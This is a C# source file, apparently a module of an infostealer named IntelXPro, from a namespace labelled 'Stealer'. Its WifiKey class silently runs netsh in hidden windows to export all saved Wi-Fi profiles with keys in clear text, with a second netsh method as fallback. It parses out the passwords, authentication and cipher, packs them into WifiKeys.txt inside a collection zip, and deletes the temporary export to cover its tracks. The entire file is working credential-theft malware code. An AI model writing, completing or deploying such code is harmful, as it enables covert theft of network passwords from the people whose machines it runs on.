using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Xml.Linq;

namespace IntelXPro.src.IntelXPro.Stealer.Device
{
    internal class WifiKey : ITarget
    {
        private class WifiInfo
        {
            public string Profile;

            public string Key;

            public string Authentication;

            public string Cipher;
        }

        public void Collect(InMemoryZip zip, Counter counter)
        {
            WifiInfo[] array = TryExportAndParseProfiles() ?? FallbackParseProfiles();
            if (array != null && array.Length != 0)
            {
                int num = Math.Max("Profile".Length, MaxLength(array, (WifiInfo r) => r.Profile));
                int num2 = Math.Max("Key".Length, MaxLength(array, (WifiInfo r) => r.Key));
                int num3 = Math.Max("Authentication".Length, MaxLength(array, (WifiInfo r) => r.Authentication));
                int num4 = Math.Max("Cipher".Length, MaxLength(array, (WifiInfo r) => r.Cipher));
                List<string> list = new List<string>();
                list.Add("Profile".PadRight(num) + " | " + "Key".PadRight(num2) + " | " + "Authentication".PadRight(num3) + " | " + "Cipher".PadRight(num4));
                list.Add(new string('-', num + num2 + num3 + num4 + 9));
                List<string> list2 = list;
                WifiInfo[] array2 = array;
                foreach (WifiInfo wifiInfo in array2)
                {
                    string text = (string.IsNullOrEmpty(wifiInfo.Profile) ? "N/A" : wifiInfo.Profile);
                    string text2 = (string.IsNullOrEmpty(wifiInfo.Key) ? "Not found" : wifiInfo.Key);
                    string text3 = (string.IsNullOrEmpty(wifiInfo.Authentication) ? "Not found" : wifiInfo.Authentication);
                    string text4 = (string.IsNullOrEmpty(wifiInfo.Cipher) ? "Not found" : wifiInfo.Cipher);
                    list2.Add(text.PadRight(num) + " | " + text2.PadRight(num2) + " | " + text3.PadRight(num3) + " | " + text4.PadRight(num4));
                }
                zip.AddTextFile("WifiKeys.txt", string.Join("\n", list2));
            }
        }

        private int MaxLength(WifiInfo[] arr, Func<WifiInfo, string> selector)
        {
            if (arr == null || arr.Length == 0)
            {
                return 0;
            }
            int num = 0;
            for (int i = 0; i < arr.Length; i++)
            {
                string text = selector(arr[i]) ?? "";
                if (text.Length > num)
                {
                    num = text.Length;
                }
            }
            return num;
        }

        private WifiInfo[] TryExportAndParseProfiles()
        {
            string text = Path.Combine(Path.GetTempPath(), "IntelixWifiExport_" + Guid.NewGuid().ToString("N"));
            try
            {
                Directory.CreateDirectory(text);
            }
            catch
            {
                return null;
            }
            try
            {
                using (Process process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "netsh",
                        Arguments = "wlan export profile key=clear folder=\"" + text + "\"",
                        UseShellExecute = false,
                        RedirectStandardOutput = false,
                        CreateNoWindow = true
                    }
                })
                {
                    process.Start();
                    process.WaitForExit(5000);
                }
                string[] array = Directory.EnumerateFiles(text, "*.xml").ToArray();
                if (array.Length == 0)
                {
                    return null;
                }
                List<WifiInfo> list = new List<WifiInfo>(array.Length);
                string[] array2 = array;
                foreach (string text2 in array2)
                {
                    try
                    {
                        XDocument xDocument = XDocument.Load(text2);
                        string text3 = xDocument.Descendants().FirstOrDefault((XElement e) => string.Equals(e.Name.LocalName, "name", StringComparison.OrdinalIgnoreCase) && e.Parent != null && string.Equals(e.Parent.Name.LocalName, "SSID", StringComparison.OrdinalIgnoreCase))?.Value;
                        if (string.IsNullOrEmpty(text3))
                        {
                            text3 = Path.GetFileNameWithoutExtension(text2);
                        }
                        string text4 = xDocument.Descendants().FirstOrDefault((XElement e) => string.Equals(e.Name.LocalName, "keyMaterial", StringComparison.OrdinalIgnoreCase))?.Value;
                        string text5 = xDocument.Descendants().FirstOrDefault((XElement e) => string.Equals(e.Name.LocalName, "authentication", StringComparison.OrdinalIgnoreCase))?.Value;
                        string text6 = xDocument.Descendants().FirstOrDefault((XElement e) => string.Equals(e.Name.LocalName, "encryption", StringComparison.OrdinalIgnoreCase))?.Value;
                        list.Add(new WifiInfo
                        {
                            Profile = (text3 ?? "N/A"),
                            Key = (string.IsNullOrEmpty(text4) ? "Not found" : text4),
                            Authentication = (string.IsNullOrEmpty(text5) ? "Not found" : text5),
                            Cipher = (string.IsNullOrEmpty(text6) ? "Not found" : text6)
                        });
                    }
                    catch
                    {
                    }
                }
                return list.ToArray();
            }
            catch
            {
                return null;
            }
            finally
            {
                try
                {
                    if (Directory.Exists(text))
                    {
                        Directory.Delete(text, recursive: true);
                    }
                }
                catch
                {
                }
            }
        }

        private WifiInfo[] FallbackParseProfiles()
        {
            string[] profiles = Profiles();
            if (profiles == null || profiles.Length == 0)
            {
                return new WifiInfo[0];
            }
            WifiInfo[] results = new WifiInfo[profiles.Length];
            Parallel.For(0, profiles.Length, delegate (int i)
            {
                string text = profiles[i];
                try
                {
                    using (Process process = new Process
                    {
                        StartInfo = new ProcessStartInfo
                        {
                            FileName = "netsh",
                            Arguments = "wlan show profile name=\"" + text + "\" key=clear",
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            CreateNoWindow = true,
                            StandardOutputEncoding = Encoding.UTF8
                        }
                    })
                    {
                        process.Start();
                        string input = process.StandardOutput.ReadToEnd();
                        process.WaitForExit();
                        string match = GetMatch(input, "Key Content\\s*:\\s*(.+)");
                        string match2 = GetMatch(input, "Authentication\\s*:\\s*(.+)");
                        string match3 = GetMatch(input, "Cipher\\s*:\\s*(.+)");
                        results[i] = new WifiInfo
                        {
                            Profile = text,
                            Key = (string.IsNullOrEmpty(match) ? "Not found" : match),
                            Authentication = (string.IsNullOrEmpty(match2) ? "Not found" : match2),
                            Cipher = (string.IsNullOrEmpty(match3) ? "Not found" : match3)
                        };
                    }
                }
                catch
                {
                    results[i] = new WifiInfo
                    {
                        Profile = text,
                        Key = "Error",
                        Authentication = "Error",
                        Cipher = "Error"
                    };
                }
            });
            return results;
        }

        private string[] Profiles()
        {
            string[] array2;
            try
            {
                using (Process process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "netsh",
                        Arguments = "wlan show profiles",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true,
                        StandardOutputEncoding = Encoding.UTF8
                    }
                })
                {
                    process.Start();
                    string text = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    string[] array = text.Split(new char[2] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                    List<string> list = new List<string>();
                    array2 = array;
                    string[] array3 = array2;
                    foreach (string text2 in array3)
                    {
                        int num = text2.LastIndexOf(':');
                        if (num >= 0 && num + 1 < text2.Length)
                        {
                            string text3 = text2.Substring(num + 1).Trim();
                            if (!string.IsNullOrEmpty(text3))
                            {
                                list.Add(text3);
                            }
                        }
                    }
                    array2 = list.ToArray();
                }
            }
            catch
            {
                array2 = new string[0];
            }
            return array2;
        }

        private string GetMatch(string input, string pattern)
        {
            if (string.IsNullOrEmpty(input))
            {
                return string.Empty;
            }
            Match match = Regex.Match(input, pattern, RegexOptions.IgnoreCase | RegexOptions.Multiline);
            if (!match.Success)
            {
                return string.Empty;
            }
            return match.Groups[1].Value.Trim();
        }
    }

}
